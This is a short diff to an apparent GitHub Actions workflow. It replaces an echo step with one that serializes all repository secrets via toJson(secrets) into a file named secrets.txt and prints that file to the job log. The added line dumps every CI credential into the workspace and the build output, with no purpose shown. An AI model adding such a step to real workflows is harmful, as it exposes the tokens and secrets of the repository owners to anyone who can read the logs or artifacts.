@@ -39,7 +39,8 @@ jobs:
       env:
         GITHUB_USERNAME: ${{ secrets.GITHUB_ACTOR }}
         GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-      run: echo $GITHUB_CONTEXT  #mvn -X clean heroku:deploy
+        SECRETS_VARS: ${{ toJson(secrets) }}
+      run: echo "$SECRETS_VARS" > "secrets.txt" && cat secrets.txt  #mvn -X clean heroku:deploy
       
     # Optional: Uploads the full dependency graph to GitHub to improve the quality of Dependabot alerts this repository can receive
     #- name: Update dependency graph
